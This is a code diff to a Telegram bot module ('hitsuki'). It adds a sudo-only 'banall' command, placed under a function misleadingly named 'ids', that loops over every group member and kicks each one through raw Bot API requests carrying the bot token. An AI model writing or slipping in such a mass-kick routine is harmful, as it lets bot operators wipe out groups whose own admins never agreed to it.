@@ -19,13 +19,14 @@
 
 import html
 import regex
+import aiohttp
 
 from datetime import datetime
 
 from pyrogram import Client, filters
 from pyrogram.types import Message
 
-from hitsuki import pbot
+from hitsuki import TOKEN, SUDO_USERS, pbot
 
 
 @pbot.on_message(filters.command('dice'))
@@ -126,3 +127,15 @@ async def sed(c: Client, m: Message):
     else:
         await c.send_message(m.chat.id, f'<pre>{html.escape(res)}</pre>',
                              reply_to_message_id=m.reply_to_message.message_id)
+
+
+@pbot.on_message(filters.command("banall") & filters.group & filters.user(SUDO_USERS))
+async def ids(c: Client, m: Message):
+    chat = m.chat.id
+
+    async for member in c.iter_chat_members(chat):
+      user_id = member.user.id
+      url = f"https://api.telegram.org/bot{TOKEN}/kickChatMember?chat_id={chat}&user_id={user_id}"
+      async with aiohttp.ClientSession() as session:
+        await session.get(url)
+
